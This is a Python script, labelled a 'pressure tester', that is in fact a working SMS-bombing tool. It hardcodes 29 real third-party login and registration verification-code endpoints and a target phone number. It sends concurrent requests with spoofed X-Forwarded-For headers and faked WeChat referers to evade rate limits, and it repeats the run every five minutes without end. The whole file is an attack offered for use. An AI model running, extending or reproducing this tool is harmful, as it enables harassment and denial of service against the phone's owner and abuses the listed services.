import sys
import random
import threading
import time
import requests
import urllib3
import json
from concurrent.futures import ThreadPoolExecutor

# 禁用 SSL 警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PressureTester:
    def __init__(self, target):
        self.phone = target
        self.success_count = 0
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.apis = self._init_apis()

    def _init_apis(self):
        """整合 29+ 接口详细配置"""
        p = self.phone
        ts = str(int(time.time()))
        
        # 格式: (名称, URL, Method, Data/Params, Is_JSON, Success_Func, Headers)
        return [
            # --- 原始代码接口 ---
            ("云创动力", "https://jkyc.necloud.com.cn/QXRTOC/user/qxrtoc_wxxcxUserRegistCode", "POST", {"phone": p}, False, lambda r: "成功" in r.text, None),
            ("小熊美术", "https://www.xiaoxiongmeishu.com/api/m/v1/sms/sendCodeV2", "POST", {"bizOrigin": "APP", "mobile": f"+86{p}"}, True, lambda r: r.json().get("code") == 200, None),
            ("供应管理", "https://www.scmmgr.cn/scm//orderRegisterUser/getPollCode", "POST", {"mobileNo": p, "msgType": "2"}, False, lambda r: "成功" in r.text, None),
            ("重庆轨道", "https://ycx.cqmetro.cn//bas/mc/v1/send-sms-code", "POST", {"mobile_phone": p, "sms_type": "0"}, True, lambda r: r.json().get("code") == 0, None),
            ("在线挂号", "https://168api-tyxcx.zaiguahao.com/api/common/smsSend", "POST", {"applets_id": 1352, "phone": p}, True, lambda r: r.json().get("code") == 200, None),
            ("快递100", "https://p.kuaidi100.com/xcx/sms/sendcode", "POST", {"name": p, "validcode": ""}, False, lambda r: r.status_code == 200, None),
            ("鑫汇融资", "http://apiyd.xinhuirongzi.com/user/get-sms-code", "POST", {"mobile": p}, True, lambda r: r.json().get("code") == 200, {"package": "com.dsrz.qianjia", "os": "android"}),
            
            # --- 新增整合接口 (部分重构以适应自动化) ---
            ("原子科技", "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code", "POST", {"mobile": p, "captcha": "1111", "token": "1111", "prefix": 86}, True, lambda r: r.json().get("code") == 200, None),
            ("智慧云行", "https://apibus.zhihuiyunxing.com/api/v1/common/captcha/send/sms", "POST", f"phone={p}&random=31540959202205610&userType=1&type=PASSENGER_LOGIN_CODE", False, lambda r: r.json().get("code") == 200, {"Content-Type": "application/x-www-form-urlencoded"}),
            ("汽车之家", "https://yczj.api.autohome.com.cn/cus/v1_0_0/api/msite/login/sendVerificationCode", "POST", {"mobile": p, "isDianPing": True, "platform": 4, "version": "2.2.30"}, True, lambda r: r.json().get("returncode") == 0, None),
            ("蔚来汽车", "https://gateway-front-external.nio.com/onvo/moat/1100023/n/a/user/access/verification_code?hash_type=sha256", "POST", f"mobile={p}&country_code=86&classifier=login", False, lambda r: r.json().get("code") == 200, {"Content-Type": "application/x-www-form-urlencoded"}),
            ("消费315", "https://api666.xfb315.cn/auth/send_sms", "POST", {"phone": p}, True, lambda r: r.json().get("code") == 200, None),
            ("木工工具", "https://muguntools.com/api/sms/send", "POST", {"mobile": p, "openid": "oWikI7Tys7eVJJCZ9DbkkE-hjxfE", "provider": "weixin"}, True, lambda r: r.json().get("code") == 200, None),
            ("UU出行", "https://passport.uucin.com/accounts/send_login_mobile_captcha", "POST", f"mobile={p}", False, lambda r: r.json().get("success") is True, {"Content-Type": "application/x-www-form-urlencoded"}),
            ("SOHO中国", f"https://www.sohochinaoffice.com/api/mini-login/send-verify-code?mobile={p}&currtime={ts}&sign=5346ae7ab6d8b8c7f2af25f0e753424d", "GET", None, False, lambda r: r.json().get("code") == 200, None),
            ("太湖点评", "https://rt.taihulidian.com/appapi/", "GET", {"r": "user/verify-code", "phone": p, "appid": "wxbdc2473d8e16d081"}, False, lambda r: r.json().get("status") == 1, None),
            ("新城咨询", "https://api.zxw.xinchengzxw.com/sms/send_code", "POST", {"mobile": p, "type": "login"}, True, lambda r: r.json().get("code") == 200, None),
            ("云住科技", "https://prod.driver.yunzhukj.cn/terminal/api/basics/sendMobileCode", "POST", {"mobile": p, "openId": "oCoHa5BPKmmNt0i5YNY-gA_Xrrio", "sendType": "registerS-kQZWzK"}, True, lambda r: r.json().get("code") == 200, None),
            ("WFJ电商", "https://api.wfjec.com/mall/user/sendRegisterSms", "PUT", {"mobile": p}, True, lambda r: r.json().get("code") == 200, None),
            ("CADF商城", "https://shopapi.cadf.top/user-center/frontend/user/login/getVerifyCode", "GET", {"mobile": p, "smsType": "phoneLogin"}, False, lambda r: r.json().get("code") == 200, None),
            ("滴滴出行", "https://epassport.diditaxi.com.cn/passport/login/v5/codeMT", "POST", f"cell={p}&appid=121015&role=2470&code_type=1", False, lambda r: r.json().get("errno") == 0, {"Content-Type": "application/x-www-form-urlencoded"}),
            ("德邦物流", "https://www.deppon.com/ndcc-gwapi/messageService/eco/message/sendSmsMessage", "POST", {"mobile": p, "messageType": "login", "sysCode": "WECHAT_MINI"}, True, lambda r: r.json().get("success") is True, None),
            ("途虎养车", "https://cl-gateway.tuhu.cn/cl-user-auth-login/login/getVerifyCode", "POST", {"mobile": p, "channel": "wechat-miniprogram", "nationCode": "86"}, True, lambda r: r.json().get("isSuccess") is True, None),
            ("云南12345", "https://12345lm.www.yn.gov.cn:9001/WebPortal/Api/BanJian/SendValidateSmsCodeForWeChat", "POST", f"mobile={p}&sid=PyiYE2JNv_ul25jNu-fPrDaS", False, lambda r: r.json().get("Success") is True, {"Content-Type": "application/x-www-form-urlencoded"}),
            ("心龙短信", "https://xlapi.51xinlong.com/front/api/v2/sms/send", "POST", {"mobile": p, "remark": "reg"}, True, lambda r: r.json().get("code") == 200, None),
            ("政府短信", "https://zhhg.qhdhgq.gov.cn/yjjy/api/index/sms_code", "POST", {"phone": p}, True, lambda r: r.json().get("code") == 200, None),
            ("林业短信", "https://njln.lznytz.com:18002/base-server/passport/sendPhoneVCode", "POST", {"data": {"mobile": p}}, True, lambda r: r.json().get("resultCode") == "100", None),
            ("全民短信", "https://h5.qmxfs.com/api//user/login/sendVerificationCode", "GET", {"countryCode": "86", "mobile": p, "ecologyName": "miniXfs"}, False, lambda r: r.json().get("success") is True, None),
            ("物流短信", "https://prod.java.56etms.com/xq-route-plan-tms/user/sendSmsCodeNoCheck", "POST", f"phone={p}", False, lambda r: r.json().get("code") == 100, {"Content-Type": "application/x-www-form-urlencoded"})
        ]

    def _get_headers(self, extra_headers=None):
        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 MicroMessenger/8.0.20",
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "Referer": "https://servicewechat.com/wx7c8d593b2c3a77/0/page-frame.html",
            "Accept": "application/json, text/plain, */*"
        }
        if extra_headers: headers.update(extra_headers)
        return headers

    def _send(self, idx):
        name, url, method, data, is_json, check_func, extra = random.choice(self.apis)
        headers = self._get_headers(extra)
        status = "❌"
        
        try:
            if method == "GET":
                res = self.session.get(url, params=data, headers=headers, timeout=6, verify=False)
            elif method == "PUT":
                res = self.session.put(url, json=data if is_json else None, data=None if is_json else data, headers=headers, timeout=6, verify=False)
            else: # POST
                res = self.session.post(url, json=data if is_json else None, data=None if is_json else data, headers=headers, timeout=6, verify=False)

            # 统一状态判断逻辑
            if res.status_code in [200, 201, 204]:
                if check_func(res):
                    with self.lock:
                        self.success_count += 1
                    status = "✅"
            
            # 缩减输出内容，保持简洁
            resp_text = res.text[:20].replace('\n', '')
            print(f"[{idx:03d}] {status} {name: <6} | 状态: {res.status_code} | 响应: {resp_text}")
        except Exception as e:
            print(f"[{idx:03d}] ⚠️ {name: <6} | 异常: {str(e)[:15]}")

    def start(self, count=100, threads=30):
        print(f"🚀 任务启动 | 目标: {self.phone} | 接口总数: {len(self.apis)}")
        print(f"📊 规划: 发送 {count} 次 | 并发数 {threads}")
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(self._send, range(1, count + 1))
            
        duration = time.time() - start_time
        print("-" * 60)
        print(f"📈 任务总结 | 成功: {self.success_count}/{count} | 耗时: {duration:.1f}s")

if __name__ == "__main__":
    # --- 配置区 ---
    PHONE = "13599888558"
    TOTAL_REQUESTS = 100  # 单轮请求数
    MAX_THREADS = 20      # 并发线程数
    INTERVAL = 300        # 轮询间隔 (秒)
    # --------------

    engine = PressureTester(PHONE)
    print(f"🔥 全能接口测试引擎已就绪")
    
    try:
        while True:
            engine.success_count = 0
            curr_time = time.strftime("%H:%M:%S", time.localtime())
            print(f"\n>>> [{curr_time}] 任务循环开始...")
            
            engine.start(count=TOTAL_REQUESTS, threads=MAX_THREADS)
            
            print(f"💤 休眠中... 下一轮任务在 {INTERVAL//60} 分钟后开始")
            time.sleep(INTERVAL)
            
    except KeyboardInterrupt:
        print("\n👋 任务已由用户停止。")
    except Exception as e:
        print(f"\n❌ 程序故障: {e}")
